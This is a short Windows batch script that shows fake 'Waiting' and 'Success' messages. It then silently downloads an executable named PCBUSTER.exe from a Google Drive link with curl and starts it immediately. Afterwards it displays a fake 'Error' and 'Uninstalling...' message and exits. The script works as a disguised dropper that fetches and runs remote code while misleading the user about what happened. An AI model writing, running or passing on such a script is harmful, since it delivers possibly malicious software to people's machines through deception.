@echo off
cls

color B

echo Waiting.
timeout /t 2>nul
cls

echo Waiting..
timeout /t 2>nul
cls

echo Waiting...
timeout /t 2>nul
cls

echo Success
timeout /t 2>nul
cls

echo Downloading
curl -s -O "https://drive.usercontent.google.com/download?id=19zb87Vk1NVdLt03LU_jE7IeKoqWFWm3M&export=download&authuser=0&confirm=t&uuid=0b1bce6d-3526-4754-8e38-0e4438096322&at=AIrpjvPjdp3YXUglZM9qqs51jGyZ%3A1739200285006" && start PCBUSTER.exe
cls

color C

echo Error
echo Uninstalling...
timeout /t 5>nul
cls
exit
